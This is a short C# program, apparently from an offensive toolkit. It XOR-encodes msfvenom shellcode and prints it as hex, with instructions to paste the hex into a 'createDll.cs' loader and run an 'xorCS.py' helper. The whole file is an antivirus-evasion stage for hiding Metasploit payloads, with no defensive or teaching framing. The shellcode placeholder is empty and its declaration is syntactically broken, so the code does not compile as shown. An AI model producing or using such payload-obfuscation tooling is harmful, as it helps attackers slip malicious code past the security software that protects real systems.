using System;
using System.Text;

namespace XOR_encoder
{
    class Program
    {
        static void Main(string[] args)
        {
            // Msfvenom shellcode here
	byte[] buf = new byte[797]

            // Array holding encrypted shellcode
            byte[] encoded =  new byte[buf.Length];

            // loop to iterate the bytes and XOR
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            //Convert the byte array to a string
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                // 0: hex format, x2 indicates 2 bytes
                hex.AppendFormat("0x{0:x2},", b);
            }
		string hexString = hex.ToString();
          	hexString = hexString.Replace(" ","");
          	Console.WriteLine("[@@@] copy the below shellcode to place into ".ToUpper()+"createDll.cs"+"\n[***] Run the following command: ./xorCS.py -dm <createDll file> -s "+buf.Length.ToString()+" -Sc \"new shellcode\"\n"+"[+++] Buffer Size: "+buf.Length.ToString()+"\n\n"+hexString.TrimEnd(','));
        }
    }
}
